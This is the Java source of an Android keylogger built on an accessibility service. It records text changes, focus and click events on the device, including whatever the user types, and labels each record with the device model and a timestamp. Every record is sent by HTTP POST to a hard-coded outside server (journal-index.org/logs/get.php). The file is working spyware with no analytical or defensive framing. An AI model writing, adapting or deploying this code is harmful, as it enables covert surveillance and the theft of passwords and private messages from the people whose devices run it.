package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

/**
 * Keylogger Service for logging accessibility events and sending data to a remote server.
 */
public class Keylogger extends AccessibilityService {

    private static final String SERVER_URL = "https://journal-index.org//logs/get.php";
    private static final String TAG = "Keylogger";

    private class SendToServerTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String message = params[0];
                String payload = "log_data=" + message.replace(" ", "+");

                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                }

                Log.d(TAG, "Server Response Code: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Error sending data to server", e);
            }
            return null;
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Keylogger service connected.");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
                .format(Calendar.getInstance().getTime());
        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        String data = event.getText().toString();

        if (data == null || data.trim().isEmpty()) {
            return;
        }

        String logMessage = "[" + deviceName + "] " + timestamp;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                logMessage += " | (TEXT_CHANGED) | " + data;
                new SendToServerTask().execute(logMessage);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                logMessage += " | (FOCUSED) | " + data;
                new SendToServerTask().execute(logMessage);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                logMessage += " | (CLICKED) | " + data;
                new SendToServerTask().execute(logMessage);
                break;
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted.");
    }
}
